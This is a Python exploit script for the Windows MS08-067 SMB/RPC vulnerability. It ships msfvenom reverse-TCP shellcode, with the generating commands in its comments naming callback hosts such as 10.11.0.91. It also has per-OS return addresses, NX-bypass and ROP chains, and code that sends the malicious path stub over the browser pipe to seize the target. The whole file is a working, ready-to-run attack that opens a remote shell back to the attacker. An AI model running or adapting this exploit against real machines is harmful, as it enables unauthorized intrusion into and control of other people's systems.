import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python

#shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


#msfvenom --nopsled=32 -p windows/shell_reverse_tcp LHOST=10.11.0.91 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -e x86/call4_dword_xor -f python -a x86

buf =  "\x90"*30
buf += "\x41\x98\x99\xf5\x48\x4b\x92\x9b\x3f\x99\x92\x9b\x48"
buf += "\x4b\x90\x98\x27\x93\xfd\xf5\x49\x27\x92\x9b\x91\x3f"
buf += "\x98\xf9\xfc\xf8\x99\x9f\x2b\xc9\x83\xe9\xaf\xe8\xff"
buf += "\xff\xff\xff\xc0\x5e\x81\x76\x0e\xf0\xe6\xa9\xb7\x83"
buf += "\xee\xfc\xe2\xf4\x0c\x0e\x2b\xb7\xf0\xe6\xc9\x3e\x15"
buf += "\xd7\x69\xd3\x7b\xb6\x99\x3c\xa2\xea\x22\xe5\xe4\x6d"
buf += "\xdb\x9f\xff\x51\xe3\x91\xc1\x19\x05\x8b\x91\x9a\xab"
buf += "\x9b\xd0\x27\x66\xba\xf1\x21\x4b\x45\xa2\xb1\x22\xe5"
buf += "\xe0\x6d\xe3\x8b\x7b\xaa\xb8\xcf\x13\xae\xa8\x66\xa1"
buf += "\x6d\xf0\x97\xf1\x35\x22\xfe\xe8\x05\x93\xfe\x7b\xd2"
buf += "\x22\xb6\x26\xd7\x56\x1b\x31\x29\xa4\xb6\x37\xde\x49"
buf += "\xc2\x06\xe5\xd4\x4f\xcb\x9b\x8d\xc2\x14\xbe\x22\xef"
buf += "\xd4\xe7\x7a\xd1\x7b\xea\xe2\x3c\xa8\xfa\xa8\x64\x7b"
buf += "\xe2\x22\xb6\x20\x6f\xed\x93\xd4\xbd\xf2\xd6\xa9\xbc"
buf += "\xf8\x48\x10\xb9\xf6\xed\x7b\xf4\x42\x3a\xad\x8e\x9a"
buf += "\x85\xf0\xe6\xc1\xc0\x83\xd4\xf6\xe3\x98\xaa\xde\x91"
buf += "\xf7\x19\x7c\x0f\x60\xe7\xa9\xb7\xd9\x22\xfd\xe7\x98"
buf += "\xcf\x29\xdc\xf0\x19\x7c\xe7\xa0\xb6\xf9\xf7\xa0\xa6"
buf += "\xf9\xdf\x1a\xe9\x76\x57\x0f\x33\x3e\xdd\xf5\x8e\xa3"
buf += "\xbc\xf0\xbd\xc1\xb5\xf0\xf7\xf5\x3e\x16\x8c\xb9\xe1"
buf += "\xa7\x8e\x30\x12\x84\x87\x56\x62\x75\x26\xdd\xbb\x0f"
buf += "\xa8\xa1\xc2\x1c\x8e\x59\x02\x52\xb0\x56\x62\x98\x85"
buf += "\xc4\xd3\xf0\x6f\x4a\xe0\xa7\xb1\x98\x41\x9a\xf4\xf0"
buf += "\xe1\x12\x1b\xcf\x70\xb4\xc2\x95\xb6\xf1\x6b\xed\x93"
buf += "\xe0\x20\xa9\xf3\xa4\xb6\xff\xe1\xa6\xa0\xff\xf9\xa6"
buf += "\xb0\xfa\xe1\x98\x9f\x65\x88\x76\x19\x7c\x3e\x10\xa8"
buf += "\xff\xf1\x0f\xd6\xc1\xbf\x77\xfb\xc9\x48\x25\x5d\x49"
buf += "\xaa\xda\xec\xc1\x11\x65\x5b\x34\x48\x25\xda\xaf\xcb"
buf += "\xfa\x66\x52\x57\x85\xe3\x12\xf0\xe3\x94\xc6\xdd\xf0"
buf += "\xb5\x56\x62"


nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
